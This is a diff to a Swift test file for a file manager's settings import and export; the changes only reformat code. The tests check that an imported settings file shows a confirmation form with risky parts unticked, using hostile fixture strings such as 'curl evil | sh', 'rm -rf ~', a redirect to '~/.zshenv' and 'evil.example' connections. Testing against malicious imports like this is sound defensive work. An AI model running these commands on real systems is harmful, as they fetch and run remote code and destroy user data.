@@ -27,13 +27,20 @@ import Testing
         try box.folder("A")
         try box.folder("B")
         plugin = ConfigurationPlugin(
-            launchesApplications: false, background: nil, listFolder: box.url("lists"),
+            launchesApplications: false,
+            background: nil,
+            listFolder: box.url("lists"),
             settingsKeys: {
                 ["extra.key", "systemTools.history", "network.connections", "configuration.userCommands.unreadable"]
-            })
+            }
+        )
         bench = TestBench(
-            plugins: [NavigationPlugin(), SelectionPlugin(), plugin], fileSystems: [LocalFileSystem()],
-            left: box.url("A"), right: box.url("B"), settings: settings)
+            plugins: [NavigationPlugin(), SelectionPlugin(), plugin],
+            fileSystems: [LocalFileSystem()],
+            left: box.url("A"),
+            right: box.url("B"),
+            settings: settings
+        )
         bench.kernel.preferences.add(
             PreferencePage(
                 title: "Demo",
@@ -42,7 +49,9 @@ import Testing
                     Preference("demo.text", "Text", .text(default: "x")),
                     Preference("demo.choice", "Choice", .choice(["a", "b", "c"], default: 0)),
                     Preference("macIntegration.editor", "Editor", .text(default: "TextEdit"))
-                ]))
+                ]
+            )
+        )
     }
 
     /// Writes a settings file with these entries and returns where.
@@ -74,7 +83,8 @@ import Testing
         commands.perform("afm_ImportSettings", .location(url))
         #expect(
             ui.log == ["form: Import Settings"] && settings.data(forKey: "demo.flag") == nil
-                && center.store.userCommands.isEmpty)
+                && center.store.userCommands.isEmpty
+        )
 
         // The form names every part that needs a tick, with what it holds.
         let fields = try #require(ui.forms.last)
@@ -87,7 +97,8 @@ import Testing
             parts.allSatisfy {
                 guard case .checkbox(let isOn) = $0.kind else { return false }
                 return !isOn
-            })
+            }
+        )
         func contents(_ key: String) -> String {
             if case .multilineText(let text)? = fields.first(where: { $0.key == key + ".contents" })?.kind {
                 return text
@@ -96,20 +107,25 @@ import Testing
         }
         #expect(
             contents("commands").contains("em_x:  curl evil | sh   parameters: %P")
-                && contents("commands").contains("Start menu “Documents”:  rm -rf ~"))
+                && contents("commands").contains("Start menu “Documents”:  rm -rf ~")
+        )
         #expect(
             contents("keys") == "em_x:  return"
-                && contents("programs").contains("macIntegration.editor:  /tmp/evil.app"))
+                && contents("programs").contains("macIntegration.editor:  /tmp/evil.app")
+        )
         #expect(
             contents("programs").contains("fileOperations.log.file:  /Users/me/.zshenv")
-                && contents("trust").contains("bank.example"))
+                && contents("trust").contains("bank.example")
+        )
         #expect(
             contents("connections").contains("u@evil.example")
-                && contents("hotlist").contains("afm_RunCommandLine curl evil | sh"))
+                && contents("hotlist").contains("afm_RunCommandLine curl evil | sh")
+        )
         #expect(contents("tabs").contains("sftp://evil.example/x"))
         let summary = fields[0].label
         #expect(
-            summary.contains("3 entries the program does not know are left out") && summary.contains("nobody.knows"))
+            summary.contains("3 entries the program does not know are left out") && summary.contains("nobody.knows")
+        )
 
         // Accepted as proposed: the ordinary settings come in, none of the parts does.
         ui.formAnswers = [.accept]
@@ -117,7 +133,8 @@ import Testing
         #expect(settings.flag("demo.flag", default: false) && settings.text("demo.text", default: "") == "hello")
         #expect(
             center.store.userCommands.isEmpty && center.store.startMenu.isEmpty
-                && settings.data(forKey: KeyBindings.settingsKey) == nil)
+                && settings.data(forKey: KeyBindings.settingsKey) == nil
+        )
         for key in [
             "macIntegration.editor", "fileOperations.log.file", "network.trustedCertificates", "network.connections",
             "places.hotlist", "left.tabs",
@@ -132,11 +149,13 @@ import Testing
         commands.perform("afm_ImportSettings", .location(url))
         #expect(
             center.store.userCommands.map(\.name) == ["em_x"] && center.store.startMenu.count == 1
-                && commands.isEnabled("em_x"))
+                && commands.isEnabled("em_x")
+        )
         #expect(stored("network.trustedCertificates") == #"{"bank.example":["AA:BB"]}"#)
         #expect(
             settings.data(forKey: KeyBindings.settingsKey) == nil
-                && settings.data(forKey: "macIntegration.editor") == nil)
+                && settings.data(forKey: "macIntegration.editor") == nil
+        )
     }
 
     @Test func whatIsStoredAlreadyNeedsNoQuestion() throws {
@@ -154,7 +173,8 @@ import Testing
             !fields.contains {
                 guard case .checkbox = $0.kind else { return false }
                 return true
-            })
+            }
+        )
         #expect(center.store.userCommands == [own] && settings.text("macIntegration.editor", default: "") == "BBEdit")
         // A setting the file does not have goes back to how the program came.
         #expect(settings.data(forKey: "demo.flag") == nil)
@@ -244,24 +264,32 @@ import Testing
         let url = box.url("out.json")
         // A file of that name was readable by everybody before: the new one replaces it.
         FileManager.default.createFile(
-            atPath: url.path, contents: Data("old".utf8), attributes: [.posixPermissions: 0o644])
+            atPath: url.path,
+            contents: Data("old".utf8),
+            attributes: [.posixPermissions: 0o644]
+        )
         commands.perform("afm_ExportSettings", .location(url))
         let mode = try #require(
-            try FileManager.default.attributesOfItem(atPath: url.path)[.posixPermissions] as? NSNumber)
+            try FileManager.default.attributesOfItem(atPath: url.path)[.posixPermissions] as? NSNumber
+        )
         #expect(mode.intValue == 0o600)
         #expect(try SettingsArchive(data: Data(contentsOf: url)).values.keys.sorted() == ["extra.key"])
         #expect(ui.log == ["inform: The settings were exported"])
         #expect(!(try String(contentsOf: url, encoding: .utf8)).contains("secret"))
         #expect(
-            try FileManager.default.contentsOfDirectory(atPath: box.root.path).filter { $0.hasSuffix(".tmp") }.isEmpty)
+            try FileManager.default.contentsOfDirectory(atPath: box.root.path).filter { $0.hasSuffix(".tmp") }.isEmpty
+        )
 
         // Asked for, the histories and the connections are in it; the copies of unreadable data never are.
         center.exportSettings(
-            to: url, options: SettingsExportOptions(includesHistory: true, includesConnections: true))
+            to: url,
+            options: SettingsExportOptions(includesHistory: true, includesConnections: true)
+        )
         #expect(
             try SettingsArchive(data: Data(contentsOf: url)).values.keys.sorted() == [
                 "extra.key", "network.connections", "systemTools.history"
-            ])
+            ]
+        )
         // What an export leaves out is not removed by importing it.
         commands.perform("afm_ExportSettings", .location(url))
         settings.set("other", forKey: "extra.key")
@@ -269,7 +297,8 @@ import Testing
         commands.perform("afm_ImportSettings", .location(url))
         #expect(
             settings.text("extra.key", default: "") == "value" && settings.data(forKey: "systemTools.history") != nil
-                && settings.data(forKey: "network.connections") != nil)
+                && settings.data(forKey: "network.connections") != nil
+        )
 
         // The export dialog offers both, switched off.
         ui.formAnswers = [.values(["history": .flag(true)])]
@@ -280,9 +309,11 @@ import Testing
     }
 
     @Test func storedListsAreBoundedAndUnreadableDataIsKeptTwice() async {
-        let many = (0..<(ConfigurationStore.startMenuLimit + 100)).map {
-            #"{"title":"t\#($0)","action":{"command":"ls"}}"#
-        }.joined(separator: ",")
+        let many = (0..<(ConfigurationStore.startMenuLimit + 100))
+            .map {
+                #"{"title":"t\#($0)","action":{"command":"ls"}}"#
+            }
+            .joined(separator: ",")
         settings.set(Data("[\(many)]".utf8) as Data?, forKey: "configuration.startMenu")
         let store = ConfigurationStore(settings: settings)
         #expect(store.startMenu.count == ConfigurationStore.startMenuLimit)
@@ -290,7 +321,8 @@ import Testing
         center.ensureSlots(1_000_000)
         #expect(
             commands[StartMenuEntry.commandID(at: ConfigurationStore.startMenuLimit - 1)] != nil
-                && commands[StartMenuEntry.commandID(at: ConfigurationStore.startMenuLimit)] == nil)
+                && commands[StartMenuEntry.commandID(at: ConfigurationStore.startMenuLimit)] == nil
+        )
 
         // A second damage is kept as well as the first.
         settings.set(Data("first damage".utf8) as Data?, forKey: "configuration.userCommands")
@@ -300,6 +332,7 @@ import Testing
         await Task.yield()
         #expect(
             stored("configuration.userCommands.unreadable") == "second damage"
-                && stored("configuration.userCommands.unreadable.previous") == "first damage")
+                && stored("configuration.userCommands.unreadable.previous") == "first damage"
+        )
     }
 }
